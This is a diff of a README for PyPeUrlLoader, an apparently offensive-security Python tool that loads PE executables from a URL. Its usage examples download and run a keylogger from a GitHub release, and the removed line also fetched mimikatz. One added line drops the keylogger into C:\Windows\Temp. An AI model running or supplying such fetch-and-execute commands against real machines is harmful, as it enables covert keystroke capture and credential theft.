@@ -10,6 +10,7 @@ This package uses PyPeLoader to load a PE program from a HTTP server
 ## Requirements
 
 This package require:
+
  - python3
  - python3 Standard Library
 
@@ -57,7 +58,8 @@ python3 -m PyPeUrlLoader   # Using python module
 python3 PyPeUrlLoader.pyz  # Using python executable
 PyPeUrlLoader.exe          # Using python Windows executable
 
-PyPeUrlLoader https://github.com/mauricelambert/NimKeylogger/releases/download/v0.0.1/Keylogger.exe https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe
+PyPeUrlLoader https://github.com/mauricelambert/NimKeylogger/releases/download/v0.0.1/Keylogger.exe keylogger
+PyPeUrlLoader https://github.com/mauricelambert/NimKeylogger/releases/download/v0.0.1/Keylogger.exe keylogger C:\Windows\Temp\keylogger.exe
 ```
 
 ## Links
